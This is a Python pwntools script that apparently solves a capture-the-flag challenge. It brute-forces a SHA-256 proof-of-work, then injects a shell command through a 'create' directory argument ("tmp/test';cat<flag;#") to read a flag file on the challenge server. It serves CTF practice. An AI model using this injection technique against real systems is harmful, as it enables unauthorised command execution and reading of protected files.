#!/usr/bin/env python3
import re
import struct
import hashlib
from pwn import remote, context

context.log_level = "info"

HOST = "124.221.39.54"
PORT = 10001

FLAG_RE = re.compile(rb"0ops\{[^\}]+\}")

def solve_pow(challenge_hex: str) -> str:
    """
    Need nonce such that SHA256(challenge || nonce) has 24 leading zero bits,
    i.e. digest[0:3] == b'\\x00\\x00\\x00'.
    We'll brute-force a 4-byte nonce efficiently with a reusable buffer.
    """
    challenge = bytes.fromhex(challenge_hex)
    if len(challenge) != 16:
        raise ValueError("Expected 16-byte challenge")

    buf = bytearray(challenge + b"\x00" * 4)  # 20 bytes total
    mv = memoryview(buf)

    i = 0
    while True:
        # little-endian vs big-endian doesn't matter; just be consistent
        struct.pack_into("<I", buf, 16, i)
        d = hashlib.sha256(mv).digest()
        if d[0] == 0 and d[1] == 0 and d[2] == 0:
            return buf[16:20].hex()
        i = (i + 1) & 0xFFFFFFFF

def main():
    io = remote(HOST, PORT)

    io.recvuntil(b"challenge (hex): ")
    chal_hex = io.recvline().strip().decode()
    io.recvuntil(b"nonce (hex): ")

    nonce_hex = solve_pow(chal_hex)
    io.sendline(nonce_hex.encode())

    # Now the socket is handed to /env_manager inside the jail.
    # Wait for its prompt.
    io.recvuntil(b"Enter command:")

    # Command injection via create <dir>
    payload_dir = r"create tmp/test';cat<flag;#"
    io.sendline(payload_dir.encode())

    # Receive all output after sending the command
    # The command injection takes time, so we need to receive continuously
    data = b""

    # Keep receiving data for a longer period to catch all output
    import time
    start_time = time.time()
    last_received_time = start_time

    while time.time() - start_time < 15.0:  # Receive for up to 15 seconds
        try:
            # Use a very short timeout to keep receiving
            chunk = io.recv(timeout=0.2)
            if chunk:
                data += chunk
                last_received_time = time.time()
                print(f"[DEBUG] Received {len(chunk)} bytes, total: {len(data)} bytes")
                # Check if we got the next prompt
                if b"Enter command:" in data:
                    print("[DEBUG] Got next prompt, breaking")
                    break
            else:
                # No data received, check if it's been too quiet
                if time.time() - last_received_time > 2.0:
                    print("[DEBUG] No data for 2 seconds, checking if we're done...")
                    # If we have some data and it's been quiet, we might be done
                    if len(data) > 100:
                        break
                time.sleep(0.1)
        except EOFError:
            print("[DEBUG] Connection closed")
            break
        except Exception as e:
            print(f"[DEBUG] Receive error: {e}")
            # Don't break on error, try to continue
            time.sleep(0.1)

    print(f"[DEBUG] Finished receiving. Total data: {len(data)} bytes")

    # Search for flag in the received data
    m = FLAG_RE.search(data)
    if m:
        print(f"Flag found: {m.group(0).decode(errors='replace')}")
        return

    
    # If still no flag, print all received data for debugging
    print("No flag found in output. Received data:")
    print("=" * 50)
    print(data.decode(errors="replace"))
    print("=" * 50)

if __name__ == "__main__":
    main()
